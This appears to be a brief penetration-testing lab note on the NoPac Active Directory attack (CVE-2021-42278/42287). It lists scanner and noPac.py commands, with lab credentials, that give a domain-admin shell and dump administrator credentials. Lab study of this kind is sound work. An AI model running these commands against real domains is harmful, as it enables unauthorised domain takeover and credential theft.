# NoPac (SamAccountName Spoofing)
THe vulnerability is the exploitation of CVE-2021-42278 and CVE-2021-42287 in Microsoft Active Directory environments that use Kerberos.

This vulnerability allows an attacker with standard domain user credentials to manipulate the sAMAccountName of a computer account and abuse Kerberos validation flaws to impersonate a Domain Controller and escalate privileges to Domain Admin, leading to full domain compromise.
Reconnaissance
```
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
Exploit:
- Reverse Shell
```
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
- TGT
```
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```
